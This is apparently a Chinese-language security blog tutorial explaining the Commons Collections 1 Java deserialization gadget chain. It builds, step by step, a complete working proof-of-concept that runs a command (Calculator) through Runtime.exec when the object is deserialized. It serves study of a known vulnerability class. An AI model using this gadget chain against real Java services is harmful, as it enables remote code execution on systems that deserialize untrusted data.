# CommonsCollections1链详解


# CommonsCollections1链详解
jdk8源码下载
https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4
**漏洞触发点在**`org.apache.commons.collections.functors.InvokerTransformer`
其中的`transform()`方法

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142003386.png)

很明显的一个反射调用，其中`iMethodName、iParamTypes、iArgs`都是可控的变量，便可以调用任意方法和任意参数
看一下构造器是如何赋值的

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142005500.png)

构造一个简单的 payload 试试
`new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;}).transform(Runtime.getRuntime());`
``

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142007538.png)

找一个任意类调用`transforms()`方法的方法，这里选择`org.apache.commons.collections.map.TransformedMap`类的`checkSetValue()`方法

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142009339.png)


![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142010479.png)

`valueTransformer`变量可控

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142011147.png)

但是因为构造器是`protected`修饰，所以无法直接调用，利用这里的静态方法`decorate()`进行了调用

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142012194.png)

再查看一下哪里调用了`checkSetValue()`方法，只有这一处

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142022694.png)

`setValue()`方法调用了`checkSetValue()`，构造一个`payload`，看看能不能通
```java
Runtime r = Runtime.getRuntime();  
InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;});  
HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();  
map.put(&#34;key&#34;,&#34;value&#34;);  
Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);  
  
for(Map.Entry entry:transformedMap.entrySet()){  
    entry.setValue(r);
```

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142036218.png)

接着找一个`setValue()`方法的调用，在`sun.reflect.annotation.AnnotationInvocationHandler`类中，找到了如下方法

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142044567.png)

这里调用了`setValue()`方法，并且还在`readObject()`方法中，继续构造`poc`
```java
Runtime r = Runtime.getRuntime();  
InvokerTransformer invokerTransformer = new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;});  
HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();  
map.put(&#34;key&#34;,&#34;value&#34;);  
Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,invokerTransformer);  
  
Class c = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);  
Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class);  
annotationInvocationhandleconstructor.setAccessible(true);  
Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap);
```
但是这里存在两个问题
第一个问题是`Runtime`没有实现`Seriablable`接口，无法参与序列化过程
利用反射来解决，这里再利用一个`ChainedTransformer.transform`方法

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142055839.png)

简单来说就是上一个执行`transform`方法返回的结果作为下一个执行`transform`方法输入
```java
Transformer[] transformers = new Transformer[]{  
        new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}),  
        new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
        new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})  
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
还有一个问题，无法控制`setValue()`里面的参数值

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142058315.png)

这里利用`org.apache.commons.collections.functors.ConstantTransformer`的`transform()`方法，无论传入什么，都会返回固定的值

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142059785.png)

所以完善一下上面的`poc`
```java
Transformer[] transformers = new Transformer[]{
		new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}),  
        new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
        new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})  
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
于是完整的`poc`如下
```java
package org.example.CommonsCollections;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CommonsCollection1 {  
    public static void main(String[] args) throws Exception{  
  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer(&#34;getMethod&#34;,new Class[]{String.class,Class[].class},new Object[]{&#34;getRuntime&#34;,null}),  
                new InvokerTransformer(&#34;invoke&#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),  
                new InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        chainedTransformer.transform(Runtime.class);  
        InvokerTransformer invokerTransformer =new  InvokerTransformer(&#34;exec&#34;,new Class[]{String.class},new Object[]{&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;});  
        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  
        map.put(&#34;value&#34;,&#34;value&#34;);  
        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer); 
        Class c = Class.forName(&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;);  
        Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class);  
        AnnotationInvocationHandlerConstructor.setAccessible(true);  
        Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);  
        serialize(o);  
        unserialize(&#34;ser.bin&#34;);  
  
    }  
  
    public static void serialize(Object obj) throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;ser.bin&#34;));  
        oos.writeObject(obj);  
    }  
  
    public static Object unserialize(String filename) throws Exception{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
  
    }  
}
```

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142111136.png)

### 注
这里为什么要用`Target`
`Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);`
因为`Target`中有值是`value`

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142103316.png)

这里的`getKey()`获取的就是，上面`map.put()`放入的`key`值

![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202401142108071.png)

`map.put(&#34;value&#34;,&#34;value&#34;);`
`key`放入`value`，正好能取出`Target`中的值，所以就绕过了`if`条件



---

> Author: [N1Rvana](https://nlrvana.github.io)  
> URL: https://nlrvana.github.io/posts/ca4c9c3/  

